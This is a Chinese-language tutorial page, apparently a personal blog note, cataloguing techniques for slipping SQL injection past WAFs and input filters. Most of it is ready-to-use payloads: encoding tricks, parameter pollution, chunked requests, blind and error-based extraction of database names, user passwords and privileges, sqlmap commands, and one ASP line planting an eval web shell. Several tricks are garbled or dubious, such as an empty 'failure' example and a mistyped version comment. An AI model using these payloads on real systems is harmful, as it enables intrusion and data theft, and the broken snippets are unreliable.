---
title: "SQL绕过"
published: 2026-05-22
updated: 2026-05-22
draft: false
description: "SELECT//username//FROM//users//WHERE//id=1"
image: ""
tags:
  - SQL注入
category: 网络安全
pinned: false
comment: true
author: Ziddzide
---

> 本文档的前置文档为[[3.基本的SQL注入]]

## 空白字符绕过
*常见空白字符:*

| ASCII | 十六进制  | 字符表示   | 说明                   | URL编码      |
| ----- | ----- | ------ | -------------------- | ---------- |
| 0x20  | `%20` | 普通空格   | 最常见的空格               | `%20`或 `+` |
| 0x09  | `%09` | Tab制表符 | 水平制表符                | `%09`      |
| 0x0A  | `%0A` | 换行符    | LF (Line Feed)       | `%0A`      |
| 0x0D  | `%0D` | 回车符    | CR (Carriage Return) | `%0D`      |
| 0x0B  | `%0B` | 垂直制表符  | Vertical Tab         | `%0B`      |
| 0x0C  | `%0C` | 换页符    | Form Feed            | `%0C`      |
| 0xA0  | `%A0` | 不换行空格  | Non-breaking Space   | `%A0`      |
| 0x00  | `%00` | 空字符    | Null Byte            | `%00`      |

*各数据库空白字符支持表:*

|数据库|支持的空白字符|特殊说明|
|---|---|---|
|**MySQL**​|0x20, 0x09, 0x0A, 0x0D, 0xA0|支持多种空白字符|
|**SQL Server**​|0x20, 0x09, 0x0A, 0x0D, 0x00|支持空字符分隔|
|**Oracle**​|0x20, 0x09, 0x0D, 0x0A|基本支持|
|**PostgreSQL**​|0x20, 0x09, 0x0A, 0x0D|支持常规空白|
|**SQLite**​|0x20, 0x09, 0x0A, 0x0D|支持常规空白|
### 特殊技巧:

#### 1. 注释作为空白符

```sql
-- 使用/**/注释作为空格
SELECT/**/username/**/FROM/**/users/**/WHERE/**/id=1

-- 更复杂的注释-MySQL专用
SELECT/*!username*/FROM/*!users*/WHERE/*!id=1*/

-- MySQL版本特定注释
SELECT/*!50001 username*/FROM/*!50001 users*/
```
>解释:`/*!注释*/`内的注释会被当做正常的语句执行,但是只能在MySQL当中使用
>`/*!500001 注释*/`代表版本号注释,只有当MySQL的版本号大于5.0.1的时候才会执行里面的语句
#### 2. 括号绕过

```sql
-- 使用括号避免空格
SELECT(username)FROM(users)WHERE(id=1)

-- 组合使用
?id=1')union(select(1),(2),(3))--+需要原始语句用括号闭合
```

#### 3. 数学运算绕过

```sql
-- 用数学运算代替空格
?id=1'+and+1%2b1=2--+

-- 实际示例
?id=1'%2band%2b(select%2bcount(*)%2bfrom%2busers)>0--+
```

## 大小写绕过

```sql
-- 原始（可能被拦截）
SELECT * FROM users WHERE id=1

-- 大小写绕过
SeLeCt * FrOm UsErS WhErE iD=1
sElEcT * fRoM uSeRs wHeRe Id=1
SELECT * FROM USERS WHERE ID=1
select * from USERS where ID=1
```

## 反引号绕过

### 一、反引号的基本概念

反引号是MySQL/MariaDB数据库中用于引用标识符（数据库名、表名、列名、别名等）的特殊字符。在SQL注入中，反引号可用于：

1. 绕过对空格、逗号等分隔符的过滤
    
2. 避免标识符与SQL关键字冲突
    
3. 构建特殊格式的SQL语句
    
4. 绕过某些WAF规则

### 二、反引号的基本用法

#### 1. 引用标识符


```sql
-- 正常查询
SELECT * FROM users WHERE id = 1

-- 使用反引号（功能相同）
SELECT * FROM `users` WHERE `id` = 1

-- 引用整个查询路径
SELECT * FROM `database`.`table`.`column`
```

#### 2. 包含特殊字符的标识符

```sql
-- 表名包含空格或特殊字符
SELECT * FROM `user info`  -- 表名为"user info"
SELECT * FROM `select`     -- 表名为关键字"select"
SELECT * FROM `user-table` -- 表名包含连字符
```

### 三、在SQL注入中的利用

#### 1. 失效


```sql

```

#### 2. 绕过逗号过滤


```sql
-- 原始注入（逗号被过滤）
'union select 1,2,3 --

-- 使用反引号分隔
'union select`1`2`3` --
-- 注意：这需要特定的上下文

-- 更好的方法：使用join代替逗号
'union select * from (select 1)a join (select 2)b join (select 3)c --
```

#### 3. 绕过union select检测


```sql
-- 原始（被拦截）
'union select 1,2,3 --

-- 使用反引号包裹关键字
'`union` `select` 1,2,3 --
'union`select`1,2,3 --

-- 混合使用
'`union`select`1,2,3 --
```


### 四、数据库特定语法

#### MySQL反引号


```sql
-- MySQL中反引号是标准用法
SELECT `id`, `name` FROM `users` WHERE `status` = 1
```

#### SQL Server方括号


```sql
-- SQL Server使用方括号
SELECT [id], [name] FROM [users] WHERE [status] = 1
```

#### PostgreSQL/Oracle双引号


```sql
-- PostgreSQL和Oracle使用双引号
SELECT "id", "name" FROM "users" WHERE "status" = 1
```

## 脚本语言特性绕过

### 一.变量覆盖绕过

```php
<?php
echo $_GET['id'];
 php>
```

如果在url中输出`?id=1&id=2`会返回id=2,第二次输入的变量会覆盖第一次的变量
### 二、基本概念

**脚本语言特性绕过**​ 是指利用后端脚本语言（如PHP、ASP、JSP等）在处理HTTP请求时的**解析特性、类型转换、变量处理、字符串处理**等特性，来绕过WAF和输入过滤的SQL注入技术。这种技术利用了**应用层与数据库层处理差异**的特点。

### 三、PHP语言特性绕过

#### 1. 参数名点号转换下划线


```php
// PHP自动将点号(.)转换为下划线(_)
// 原始请求: ?user.name=admin
// PHP获取: $_GET['user_name'] = 'admin'

// 注入利用
?id=1' AND 1=1 -- 
?id.1=1' AND 1=1 --  // 某些WAF可能不检测
```

#### 2. 数组参数绕过


```php
// 数组参数过滤漏洞
// 原始: ?id=1' union select 1,2,3 --
// 被拦截

// 使用数组: ?id[]=1' union select 1,2,3 --
// 某些WAF不检测数组
?user[id]=1' union select 1,2,3 --
```

#### 3. 类型转换绕过


```php
// PHP弱类型比较
'1' == 1  // true
'1abc' == 1  // true
'0' == false  // true

// 注入利用
?id=1' AND '1'='1'  // 被拦截
?id=1' AND 1=1  // 被拦截
?id=1' AND '1abc'='1def'  // 可能绕过
```

#### 4. 全局变量覆盖


```php
// register_globals开启时（PHP<5.4）
// 可覆盖任意变量
GET /page.php?id=1&_SERVER[PHP_SELF]=evil
// 注入$_SERVER['PHP_SELF']
```

### 四、ASP/ASP.NET特性绕过

#### 1. 双编码绕过


```asp
' ASP.NET IIS双重解码
' 正常: %27 -> '
' 双重: %2527 -> %27 -> '

' 攻击利用
?id=1%2527%20AND%201=1%20--
' IIS解码: 1%27 AND 1=1 --
' ASP解码: 1' AND 1=1 --
```

#### 2. Unicode编码绕过


```asp
' ASP支持Unicode编码
' 单引号的Unicode: %u0027
?id=1%u0027 AND 1=1 --
```

#### 3. 特殊字符组合

```asp
' 使用<%%>标签绕过
?id=1;%><%eval request("cmd")%><%' --
```

### 五、JSP/Servlet特性绕过

#### 1. 多重编码


```jsp
// JSP支持多重编码
// UTF-8 + URL编码
' -> %27 -> %2527 -> %252527

// 攻击
?id=1%252527%2520AND%25201=1%2520--
```

#### 2. EL表达式绕过


```jsp
// JSP EL表达式
${param.id}  // 获取参数

// 注入尝试
?id=${1+1}  // 表达式计算
?id=${pageContext.request.getParameter("cmd")}
```

### 七、通用脚本语言特性

#### 1. 请求方法混用


```
# GET + POST混合
GET /page.php?id=1
POST body: id=2' UNION SELECT 1,2,3 --

# 某些WAF只检查GET或只检查POST
# 但应用程序可能从$_REQUEST获取（包含GET和POST）
```

## 逗号绕过


```sql
select * from users where id=1 and (select (substr(database() from 1 for 1))) = 'm';
```

### 一、基本概念

**逗号绕过**​ 是指在SQL注入中，当**逗号(,)被WAF过滤或转义**时，使用其他方法实现**逗号的功能**（分隔字段、函数参数、子查询等）。逗号在SQL中主要用途：

1. 分隔SELECT语句中的多个字段
    
2. 分隔函数中的多个参数
    
3. 分隔ORDER BY、GROUP BY、LIMIT等子句中的多个元素
    
4. 分隔INSERT、UPDATE语句中的多个值
### 二、SELECT语句中的逗号绕过

#### 1. 使用JOIN代替逗号


```sql
-- 原始（使用逗号）
SELECT 1,2,3

-- 使用JOIN绕过
SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c

```

### 2. 使用UNION绕过


```sql
-- 当只需要少数几个字段时
SELECT 1 UNION SELECT 2 UNION SELECT 3

-- 但注意：这会产生多行，需要处理
```

#### 3. 使用CASE WHEN绕过

```sql
-- 将多个字段合并到一个字段
SELECT 
  CASE 
    WHEN 1=1 THEN (SELECT 1) 
    ELSE (SELECT 2) 
  END
```

### 三、函数参数中的逗号绕过

#### 1. SUBSTR/SUBSTRING函数


```sql
-- 原始（使用逗号）
SUBSTR(database(), 1, 1)

-- 使用FROM FOR语法（MySQL、PostgreSQL）
SUBSTR(database() FROM 1 FOR 1)
SUBSTRING(database() FROM 1 FOR 1)

-- 使用MID函数（MySQL）
MID(database() FROM 1 FOR 1)

-- 使用LEFT/RIGHT函数
LEFT(database(), 1)
RIGHT(database(), 1)
```

#### 2. LIMIT子句

```sql
-- 原始（使用逗号）
LIMIT 0, 1
LIMIT 1 OFFSET 0

-- 使用OFFSET语法绕过
LIMIT 1 OFFSET 0

-- 使用子查询（MySQL 8.0+）
SELECT * FROM users WHERE id = 1
OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY
```

#### 3. CONCAT函数


```sql
-- 原始（使用逗号）
CONCAT('a', 'b', 'c')

-- 使用连接符绕过（MySQL）
'a' 'b' 'c'  -- 空格连接
'a' || 'b' || 'c'  -- || 连接（需要设置PIPES_AS_CONCAT模式）

-- 使用CONCAT_WS（第一个参数是分隔符，需要逗号）
CONCAT_WS('', 'a', 'b', 'c')

-- 使用GROUP_CONCAT
SELECT GROUP_CONCAT('a', 'b', 'c')
```

### 四、盲注中的逗号绕过

#### 1. 布尔盲注

```sql
-- 原始（需要逗号）
' AND SUBSTR(database(), 1, 1) = 'a' --

-- 使用FROM FOR绕过
' AND SUBSTR(database() FROM 1 FOR 1) = 'a' --

-- 使用LIKE
' AND database() LIKE 'a%' --
```

#### 2. 时间盲注

```sql
-- 原始（需要逗号）
' AND IF(ASCII(SUBSTR(database(), 1, 1)) > 100, SLEEP(5), 1) --

-- 绕过逗号
' AND IF(ASCII(SUBSTR(database() FROM 1 FOR 1)) > 100, SLEEP(5), 1) --

-- 使用CASE WHEN
' AND CASE WHEN ASCII(SUBSTR(database() FROM 1 FOR 1)) > 100 THEN SLEEP(5) ELSE 1 END --
```

### 七、ORDER BY和GROUP BY绕过

#### 1. ORDER BY逗号绕过


```sql
-- 原始（使用逗号）
ORDER BY column1, column2

-- 使用多个ORDER BY
ORDER BY column1 ORDER BY column2

-- 使用CASE WHEN（复杂的）
ORDER BY 
  CASE WHEN 1=1 THEN column1 ELSE column2 END,
  CASE WHEN 1=1 THEN column2 ELSE column1 END
```

#### 2. GROUP BY逗号绕过


```sql
-- 原始（使用逗号）
GROUP BY column1, column2

-- 使用子查询
SELECT * FROM (
  SELECT *, ROW_NUMBER() OVER (PARTITION BY column1, column2) as rn
  FROM table
) t WHERE rn = 1
```

### 八、INSERT和UPDATE语句

#### 1. INSERT语句

```sql
-- 原始（使用逗号）
INSERT INTO users(id, name) VALUES(1, 'admin')

-- 使用多个INSERT
INSERT INTO users(id) VALUES(1);
INSERT INTO users(name) VALUES('admin');

-- 使用SET语法（MySQL）
INSERT INTO users SET id = 1, name = 'admin'
-- 注意：SET中也需要逗号，可用AND连接
```

#### 2. UPDATE语句

```sql
-- 原始（使用逗号）
UPDATE users SET id = 1, name = 'admin' WHERE id = 1

-- 使用多个UPDATE
UPDATE users SET id = 1 WHERE id = 1;
UPDATE users SET name = 'admin' WHERE id = 1;
```

## or and xor not绕过

### 一、逻辑运算符绕过

#### 1. AND运算符绕过


```sql
-- 原始
1' AND 1=1 --

-- 使用&&运算符 (MySQL)
1' && 1=1 --

-- 使用乘法运算
1' WHERE (1=1)*(1=1)=1 --

-- 使用位运算&
1' && (1=1) & (1=1) --

-- 使用CASE语句
1' WHERE CASE WHEN 1=1 THEN 1 ELSE 0 END = 1 --
```

#### 2. OR运算符绕过


```sql
-- 原始
1' OR 1=1 --

-- 使用||运算符 (MySQL)
1' || 1=1 --

-- 使用加法运算
1' WHERE (1=1)+(1=0)>=1 --

-- 使用IN运算符
1' || id IN (1) --

-- 使用UNION
1' union select 1,2,3 --
```

#### 3. XOR运算符绕过

```sql
-- 原始
1' XOR 1=1 --

-- 使用^运算符
1' ^ 1=1 --

-- 使用AND/OR/NOT组合
1' WHERE (1=1 OR 1=2) AND NOT (1=1 AND 1=2) --
```

#### 4. NOT运算符绕过


```sql
-- 原始
1' AND NOT 1=2 --

-- 使用!运算符
1' AND !(1=2) --

-- 使用比较运算符
1' AND 1<>2 --

-- 使用XOR
1' AND (1=2 XOR 1=1) --
```

## 等号绕过

### 一、基本概念

**等号绕过**​ 是在SQL注入中，当**等号（=）被WAF过滤或转义**时，使用其他**比较操作符或技巧**实现相等判断的技术。等号在SQL中用于条件判断，是构造布尔逻辑的基础。

### 二、使用比较运算符替代

#### 1. 大于小于组合


```sql
-- 原始：a = b
a = b

-- 使用大于小于组合
a > b AND a < b  -- 当a=b时，这个条件永远为假
NOT (a > b OR a < b)  -- 等价于 a = b
!(a > b OR a < b)  -- 同上

-- 实际注入示例
' AND NOT (id > 1 OR id < 1) -- 等价于 id = 1
' AND id > 0 AND id < 2 -- 当id为整数时，等价于 id = 1
```

#### 2. BETWEEN运算符


```sql
-- 使用BETWEEN替代等号
a = b  →  a BETWEEN b AND b

-- 实际注入示例
' AND id BETWEEN 1 AND 1 -- 等价于 id = 1
' AND username BETWEEN 'admin' AND 'admin' -- 等价于 username = 'admin'

-- 包含边界调整
' AND id BETWEEN 1-0.1 AND 1+0.1 -- 范围判断
```

#### 3. IN运算符

```sql
-- 使用IN(单值)替代等号
a = b  →  a IN (b)

-- 实际注入示例
' AND id IN (1) -- 等价于 id = 1
' AND username IN ('admin') -- 等价于 username = 'admin'

-- 多值情况
' AND id IN (1,2,3) -- id等于1、2或3
```

### 三、使用LIKE/RLIKE/REGEXP

#### 1. LIKE精确匹配


```sql
-- 使用LIKE精确匹配（无通配符）
a = b  →  a LIKE b

-- 实际注入示例
' AND username LIKE 'admin' -- 等价于 username = 'admin'
' AND id LIKE '1' -- 字符串比较，需注意类型

-- 配合ESCAPE
' AND username LIKE 'admin' ESCAPE '' -- 显式指定转义符
```

#### 2. RLIKE/REGEXP正则匹配


```sql
-- MySQL使用RLIKE或REGEXP
a = b  →  a RLIKE CONCAT('^', b, '$')
a = b  →  a REGEXP CONCAT('^', b, '$')

-- 实际注入示例
' AND username RLIKE '^admin$' -- 等价于 username = 'admin'
' AND password REGEXP '^123456$' -- 等价于 password = '123456'

-- 注意：REGEXP默认不区分大小写，除非指定BINARY
' AND BINARY username REGEXP '^admin$' -- 区分大小写
```

#### 3. LIKE通配符技巧


```sql
-- 使用模式匹配
' AND username LIKE 'admin%' AND username LIKE '%admin' -- 同时匹配开头和结尾
' AND username LIKE 'admin' AND LENGTH(username) = 5 -- 精确长度匹配
```

### 四、使用字符串函数

#### 1. STRCMP函数（MySQL）


```sql
-- STRCMP返回0表示相等
a = b  →  STRCMP(a, b) = 0

-- 实际注入示例
' AND STRCMP(username, 'admin') = 0 -- 等价于 username = 'admin'
' AND STRCMP(password, '123456') <=> 0 -- 安全等于运算符

-- 注意：STRCMP区分大小写
' AND STRCMP(BINARY username, 'Admin') = 0 -- 区分大小写比较
```

#### 2. LOCATE/INSTR/POSITION函数


```sql
-- 查找子串位置，位置为1且长度相等则表示相等
a = b  →  LOCATE(a, b) = 1 AND LENGTH(a) = LENGTH(b)

-- 实际注入示例
' AND LOCATE(username, 'admin') = 1 AND LENGTH(username) = LENGTH('admin')
' AND INSTR('admin', username) = 1 AND CHAR_LENGTH(username) = 5
' AND POSITION(username IN 'admin') = 1 AND OCTET_LENGTH(username) = 5
```

#### 3. 字符串连接比较


```sql
-- 通过字符串连接和截取比较
a = b  →  CONCAT(a, '') = CONCAT(b, '')
a = b  →  LEFT(CONCAT(a, 'x'), 1) = LEFT(CONCAT(b, 'x'), 1)

-- 实际注入示例
' AND CONCAT(username, '') = CONCAT('admin', '')
```

### 五、使用数学运算

#### 1. 加减法等式


```sql
-- 使用加减运算
a = b  →  (a - b) = 0
a = b  →  (a + 0) = b
a = b  →  a - b + b = b

-- 实际注入示例
' AND (id - 1) = 0 -- 等价于 id = 1
' AND id + 0 = 1 -- 等价于 id = 1
```

#### 2. 乘除法等式


```sql
-- 使用乘除运算（注意除零错误）
a = b  →  a * 1 = b
a = b  →  (a / 1) = b  -- 确保除数不为0
```

## 双关键词绕过

```sql
selselectect或者uniunionon
```

## 二次编码绕过

### 一、基本概念

**二次编码绕过**​ 是指利用**WAF/过滤器与应用层解码次数的差异**，通过对payload进行**多重编码**来绕过安全检测的技术。核心原理是：WAF只解码一次，而应用层解码多次，导致最终执行的payload与WAF检测的不同。

### 二、编码机制解析

#### 1. 单次URL编码


```
# 单引号编码
' → %27

# 基本payload编码
1' AND 1=1 -- → 1%27%20AND%201%3D1%20--
```

#### 2. 二次URL编码

```
# 对已编码的字符再次编码
% → %25
%27 → %2527
%20 → %2520
%3D → %253D

# 完整二次编码
1%27%20AND%201%3D1%20-- → 1%2527%2520AND%25201%253D1%2520--
```

#### 3. 三次及多次编码


```
# 三次编码
%2527 → %252527
%2520 → %252520

# 嵌套编码
%27 → %2527 → %252527 → %25252527
```

### 三、编码过程详解

#### 1. 正常流程

```
攻击者输入: 1' AND 1=1 --
URL编码: 1%27%20AND%201%3D1%20--
WAF解码: 1' AND 1=1 --  [检测，拦截]
应用解码: 1' AND 1=1 --  [不执行，被拦截]
```

#### 2. 二次编码绕过流程

```
攻击者输入: 1%2527%2520AND%25201%253D1%2520--
WAF解码一次: 1%27%20AND%201%3D1%20--  [检测，认为是编码内容，可能不拦截]
应用解码第一次: 1%27%20AND%201%3D1%20--
应用解码第二次: 1' AND 1=1 --  [成功执行]
```

### 四、不同字符的二次编码

#### 1. 特殊字符编码表

|字符|含义|一次编码|二次编码|三次编码|
|---|---|---|---|---|
|`'`|单引号|`%27`|`%2527`|`%252527`|
|`"`|双引号|`%22`|`%2522`|`%252522`|
||空格|`%20`|`%2520`|`%252520`|
|`=`|等号|`%3D`|`%253D`|`%25253D`|
|`;`|分号|`%3B`|`%253B`|`%25253B`|
|`(`|左括号|`%28`|`%2528`|`%252528`|
|`)`|右括号|`%29`|`%2529`|`%252529`|
|`-`|减号|`%2D`|`%252D`|`%25252D`|
|`#`|井号|`%23`|`%2523`|`%252523`|

#### 2. 完整payload二次编码


```
# 原始payload
1' UNION SELECT 1,2,3 --

# 一次编码
1%27%20UNION%20SELECT%201%2C2%2C3%20--

# 二次编码
1%2527%2520UNION%2520SELECT%25201%252C2%252C3%2520--

# 三次编码
1%252527%252520UNION%252520SELECT%2525201%25252C2%25252C3%252520--
```

## 拆分注入

### 一、基本概念

**参数拆分绕过**​ 是指将SQL注入payload拆分成**多个部分**，通过**不同的参数、不同的请求方式、不同的位置**发送，以绕过WAF对完整恶意请求的检测。核心思想是"化整为零"，让每个单独的部分看起来无害，但在应用端组合时构成恶意payload。

### 二、基本拆分原理

#### 1. 拆分成多个参数

```
# 原始恶意请求
GET /page.php?id=1' UNION SELECT 1,2,3 --

# 拆分成多个参数
GET /page.php?id=1'&p1=UNION&p2=SELECT&p3=1,2,3&p4=--
```

#### 2. 时间拆分


```
# 多次请求，每次携带部分payload
# 第一次请求
GET /page.php?id=1' UNION

# 第二次请求
GET /page.php?p=SELECT 1,2,3 --
```

#### 3. 位置拆分


```
# 将payload拆到不同位置
GET /page.php?id=1' UNION SELECT
Cookie: session=1,2,3 --
Referer: http://example.com
User-Agent: Mozilla
```

### 三、HTTP参数污染（HPP）

#### 1. 同名参数污染


```
# 利用服务器处理多个同名参数的特性
# 原始
GET /page.php?id=1' UNION SELECT 1,2,3 --

# 参数污染
GET /page.php?id=1'&id=UNION&id=SELECT&id=1,2,3&id=--

# 服务器处理方式可能：
# - 取第一个: id=1'
# - 取最后一个: id=--
# - 拼接: id=1' UNION SELECT 1,2,3 --
# - 数组: id[]=1'&id[]=UNION...
```

#### 2. 不同服务器处理差异

|服务器/框架|处理方式|示例|
|---|---|---|
|PHP/Apache|取最后一个|`?id=1&id=2`→ `$_GET['id']='2'`|
|JSP/Tomcat|取第一个|`?id=1&id=2`→ `request.getParameter("id")='1'`|
|ASP.NET/IIS|取第一个|`?id=1&id=2`→ `Request.QueryString["id"]='1'`|
|Python/Django|取最后一个|`?id=1&id=2`→ `request.GET.get('id')='2'`|
|Ruby/Rails|取第一个|`?id=1&id=2`→ `params[:id]='1'`|

#### 3. 利用HPP绕过WAF


```
# WAF可能只检查第一个参数
GET /page.php?id=1'&id=UNION SELECT 1,2,3 --
# WAF看到: id=1' (正常)
# 应用看到: id=UNION SELECT 1,2,3 -- (如果取最后一个)
```

### 四、参数位置拆分

#### 1. GET + POST混合


```
# GET参数看起来正常
GET /page.php?id=1

# POST携带恶意payload
POST /page.php
Content-Type: application/x-www-form-urlencoded

id=UNION SELECT 1,2,3 --
```

#### 2. 多个不同参数


```
# 拆分成不同参数名
GET /page.php?
  a=1'&
  b=UNION&
  c=SELECT&
  d=1,2,3&
  e=--

# 后端可能拼接
$id = $_GET['a'] . $_GET['b'] . $_GET['c'] . $_GET['d'] . $_GET['e'];
```

#### 3. Cookie + GET组合


```
# GET部分
GET /page.php?id=1'

# Cookie部分
Cookie: session=UNION SELECT 1,2,3 --
```

### 五、时间拆分攻击

#### 1. 多次请求累积


```
# 请求1：设置session
GET /set_session.php?data=1' UNION

# 请求2：使用session数据
GET /page.php?id=1' AND session_data='UNION SELECT 1,2,3 --
```

#### 2. 利用临时存储


```
-- 第一步：存储部分payload
'; SET @a='UNION SELECT 1,2' --

-- 第二步：使用存储的变量
'; EXECUTE(@a) --
```

### 六、分块传输编码

#### 1. 基本分块传输

> 查阅:[[chunked-encoding]]

```
POST /page.php HTTP/1.1
Transfer-Encoding: chunked

5
id=1'
0

7
UNION
0

8
SELECT
0

5
1,2,3
0

2
--
0
```

#### 2. 分块绕过WAF

```
# WAF可能不解析分块，而应用服务器会解析
POST /page.php HTTP/1.1
Transfer-Encoding: chunked

6
1' AND
0

7
1=1 --
0
```

### 七、参数名污染

#### 1. 大小写污染


```
# 使用不同大小写的参数名
GET /page.php?id=1'&ID=UNION&Id=SELECT&iD=1,2,3&ID=--

# 后端可能处理不区分大小写
```

#### 2. 特殊字符参数名


```
# 使用特殊字符
GET /page.php?
  id=1'&
  id[]=UNION&
  id[1]=SELECT&
  id.=1,2,3&
  id_=--
```

### 八、不同数据库的拆分技术

#### MySQL拆分

```sql
-- 使用用户变量
'; SET @a=0x556e696f6e2053656c65637420312c322c33; --  # "Union Select 1,2,3"的十六进制
'; PREPARE stmt FROM @a; EXECUTE stmt; --

-- 使用CONCAT拼接
' UNION SELECT CONCAT('1',',','2',',','3') --
```

#### SQL Server拆分


```sql
-- 使用EXEC拼接
'; EXEC('UNI' + 'ON SEL' + 'ECT 1,2,3') --

-- 使用变量
'; DECLARE @s VARCHAR(100); SET @s='UNION SELECT 1,2,3'; EXEC(@s) --
```

#### PostgreSQL拆分


```sql
-- 使用字符串连接
' UNION SELECT '1'||','||'2'||','||'3' --

-- 使用EXECUTE
'; EXECUTE 'UNION SELECT 1,2,3' --
```

#### Oracle拆分


```sql
-- 使用||连接
' UNION SELECT '1'||','||'2'||','||'3' FROM DUAL --

-- 使用EXECUTE IMMEDIATE
'; EXECUTE IMMEDIATE 'UNION SELECT 1,2,3 FROM DUAL' --
```

### 十、自动化工具使用

#### SQLMap参数拆分


```
# 使用tamper脚本
python sqlmap.py -u "http://example.com/?id=1" --tamper=apostrophemask.py

# 测试参数污染
python sqlmap.py -u "http://example.com/?id=1" --hpp

# 测试分块传输
python sqlmap.py -u "http://example.com/?id=1" --chunked
```

#### Burp Suite测试


```
# 使用Intruder的"Pitchfork"模式
# 设置多个payload位置
# 位置1: ?id=1'
# 位置2: &id=UNION
# 位置3: &id=SELECT
# 位置4: &id=1,2,3
# 位置5: &id=--
```

## 生僻函数绕过

### 一、生僻函数绕过概念

**生僻函数绕过**是指利用数据库提供的**不常用、不常见、特殊用途的函数**来绕过WAF检测的技术。这些函数通常不被WAF规则覆盖，但能实现与常见函数相同的功能。

### 二、MySQL生僻函数绕过

#### 1. 字符串拼接函数


```sql
-- 常见：CONCAT('a','b')
' UNION SELECT CONCAT(username,password) FROM users --

-- 生僻：CONCAT_WS（带分隔符）
' UNION SELECT CONCAT_WS('',username,password) FROM users --
' UNION SELECT CONCAT_WS(0x7e,username,password) FROM users --

-- 生僻：GROUP_CONCAT（聚合拼接）
' UNION SELECT GROUP_CONCAT(username) FROM users --
' UNION SELECT GROUP_CONCAT(username,password SEPARATOR ':') FROM users --
```

#### 2. 字符串截取函数


```sql
-- 常见：SUBSTR('abc',1,1)
' AND SUBSTR(database(),1,1)='a' --

-- 生僻：MID
' AND MID(database(),1,1)='a' --
' AND MID(database() FROM 1 FOR 1)='a' --

-- 生僻：SUBSTRING_INDEX
' AND SUBSTRING_INDEX(database(),'.',1)='test' --
' AND SUBSTRING_INDEX(SUBSTRING_INDEX(database(),'.',2),'.',-1)='db' --
```

#### 3. 字符编码函数

```sql
-- 常见：ASCII('a')
' AND ASCII(SUBSTR(database(),1,1))=97 --

-- 生僻：ORD
' AND ORD(SUBSTR(database(),1,1))=97 --

-- 生僻：CHAR（反向）
' AND SUBSTR(database(),1,1)=CHAR(97) --
' AND SUBSTR(database(),1,1)=CHAR(97 USING ASCII) --
```

#### 4. 进制转换函数


```sql
-- 十六进制转换
' AND SUBSTR(database(),1,1)=0x61 --  -- 'a'的十六进制
' AND SUBSTR(database(),1,1)=UNHEX('61') --
' AND SUBSTR(database(),1,1)=CONV(61,16,10) --  -- 十六进制转十进制

-- 二进制转换
' AND BIN(ASCII(SUBSTR(database(),1,1)))='1100001' --
```

### 三、时间盲注生僻函数

#### 1. 延迟函数


```sql
-- 常见：SLEEP(5)
' AND IF(1=1,SLEEP(5),0) --

-- 生僻：BENCHMARK（循环计算）
' AND IF(1=1,BENCHMARK(1000000,MD5('test')),0) --
' AND IF(1=1,BENCHMARK(1000000,SHA1('test')),0) --

-- 生僻：GET_LOCK（锁等待）
' AND IF(1=1,GET_LOCK('test',5),0) --
```

#### 2. 复杂时间消耗


```sql
-- 使用数学函数消耗时间
' AND IF(1=1,EXP(1000),0) --  -- 计算指数
' AND IF(1=1,POW(9999,9999),0) --  -- 大数幂运算
' AND IF(1=1,RAND()*BENCHMARK(1000000,RAND()),0) --
```

### 四、报错注入生僻函数

#### 1. 几何函数报错


```sql
-- 常见：updatexml、extractvalue
' AND updatexml(1,concat(0x7e,version()),1) --

-- 生僻：geometrycollection
' AND geometrycollection((select*from(select*from(select version())a)b)) --
' AND multipoint((select*from(select*from(select user())a)b)) --
' AND polygon((select*from(select*from(select database())a)b)) --
' AND multipolygon((select*from(select*from(select user())a)b)) --
' AND linestring((select*from(select*from(select version())a)b)) --
' AND multilinestring((select*from(select*from(select database())a)b)) --
```

#### 2. JSON函数报错


```sql
-- MySQL 5.7+
' AND json_extract((select concat(0x7e,version(),0x7e)),'$') --
' AND json_keys((select concat(0x7e,user(),0x7e))) --
' AND json_overlaps((select concat(0x7e,database(),0x7e)),'[]') --
```

#### 3. XML函数报错


```sql
-- 除了updatexml
' AND extractvalue(1,concat(0x7e,version())) --
' AND extractvalue(1,concat(0x7e,(select user()))) --
```

### 五、信息收集生僻函数

#### 1. 系统信息函数


```sql
-- 常见：version(), user(), database()
' UNION SELECT version(),user(),database() --

-- 生僻：系统变量
' UNION SELECT @@version,@@hostname,@@datadir --
' UNION SELECT @@version_compile_os,@@version_compile_machine,@@basedir --
' UNION SELECT @@GLOBAL.version,@@SESSION.version,@@LOCAL.version --

-- 生僻：性能模式
' UNION SELECT VARIABLE_VALUE,1,2 FROM performance_schema.global_status 
   WHERE VARIABLE_NAME='UPTIME' --
```

#### 2. 权限信息函数


```sql
-- 常见：current_user()
' UNION SELECT current_user(),user(),session_user() --

-- 生僻：权限检查
' UNION SELECT SUPER_PRIV,PROCESS_PRIV,FILE_PRIV FROM mysql.user 
   WHERE user=SUBSTRING_INDEX(USER(),'@',1) --
```

### 六、条件判断生僻方法

#### 1. 不使用IF的条件判断


```sql
-- 常见：IF(condition,true,false)
' AND IF(ASCII(SUBSTR(database(),1,1))>100,sleep(5),0) --

-- 生僻：CASE WHEN
' AND CASE WHEN ASCII(SUBSTR(database(),1,1))>100 THEN sleep(5) ELSE 0 END --

-- 生僻：ELT函数
' AND ELT(ASCII(SUBSTR(database(),1,1))>100,sleep(5),0) --
' AND ELT(1,sleep(5)) --  -- 总是执行sleep

-- 生僻：FIELD函数
' AND FIELD(ASCII(SUBSTR(database(),1,1))>100,1,0) --
```

#### 2. 位运算条件


```sql
-- 使用位运算代替逻辑运算
' AND (ASCII(SUBSTR(database(),1,1))>100)<<2 --  -- 左移
' AND (ASCII(SUBSTR(database(),1,1))>100)&1 --  -- 位与
' AND (ASCII(SUBSTR(database(),1,1))>100)|0 --  -- 位或
' AND (ASCII(SUBSTR(database(),1,1))>100)^0 --  -- 位异或
```

### 七、类型转换生僻技巧

#### 1. 隐式类型转换


```sql
-- 利用类型转换绕过
' AND '1'=1 --  -- 字符串转数字比较
' AND 0=username --  -- 如果username以非数字开头，转为0
' AND 1=('1'+username) --  -- 字符串连接数字

-- 使用算术运算触发转换
' AND 1=(1+username) --
' AND 1=(username-0) --
' AND 1=(username*1) --
' AND 1=(username/1) --
```

#### 2. 显式类型转换函数


```sql
-- CAST函数
' AND CAST(username AS SIGNED)=1 --
' AND CAST(username AS CHAR)='admin' --
' AND CAST(username AS BINARY)='admin' --

-- CONVERT函数
' AND CONVERT(username,SIGNED)=1 --
' AND CONVERT(username,CHAR)='admin' --
' AND CONVERT(username USING latin1)='admin' --
```

### 八、数学函数绕过

#### 1. 数学运算代替比较


```sql
-- 不使用=的比较
